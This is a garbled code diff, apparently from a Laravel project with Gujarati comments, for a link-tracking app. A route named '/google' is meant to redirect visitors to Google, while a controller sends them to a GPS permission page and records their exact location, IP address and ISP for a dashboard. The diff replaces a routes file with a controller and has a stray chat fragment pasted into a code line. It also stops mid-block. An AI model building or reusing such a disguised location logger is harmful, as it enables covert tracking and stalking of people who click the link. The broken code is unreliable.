@@ -1,26 +1,30 @@
-
 <?php
 
-use Illuminate\Support\Facades\Route;
-use App\Http\Controllers\TrackController;
+namespace App\Http\Controllers;
 
-// મેઈન પેજ
-Route::get('/', function () {
-    return "App Working";
-});
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
+use Stevebauman\Location\Facades\Location;
 
-// ટ્રેકિંગ માટેનો રૂટ (ગૂગલ પર રીડાયરેક્ટ કરશે)
-Route::get('/google', [TrackController::class, 'track'])->name('track');
+class TrackController extends Controller
+{
+    // ૧. યુઝરને GPS પરમિશન પેજ પર મોકલવા માટે
+    public function track(Request $request)
+    {
+        return view('tracking_page');
+    }
 
-// ડેશબોર્ડ રૂટ (ડેટા જોવા અને સર્ચ કરવા માટે)
-Route::get('/dashboard', [TrackController::class, 'dashboard'])->name('dashboard');
+    // ૨. સચોટ GPS લોકેશન અને બાકીનો ડેટા સેવ કરવા માટે
+    public function saveExactLocation(Request $request)
+    {
+        // IP મેળવો
+        $ip = $request->header('X-Forwarded-For')
+            ? explode(',', $request->header('X-Forwarded-For'))[0]
+            : $request->ip();
 
-// સિંગલ રેકોર્ડ ડિલીટ કરવા માટે
-Route::delete('/click/delete/{id}', [TrackController::class, 'destroy'])->name('click.delete');
+        // City/Country માટે (બેકઅપ)
+        $locationData = Location::get(trim($ip));
 
-// બધો જ ડેટા એકસાથે ડિલીટ કરવા માટે
-// ખાતરી કરજો કે Blade માં {{ route('clicks.deleteall') }} જ લખ્યું હોય
-Route::delete('/clicks/delete-all', [TrackController::class, 'destroyAll'])->name('clicks.deleteall');    aama step 3 update
         // ISP મેળવવા માટે API
         $ispName = 'Unknown';
         try {
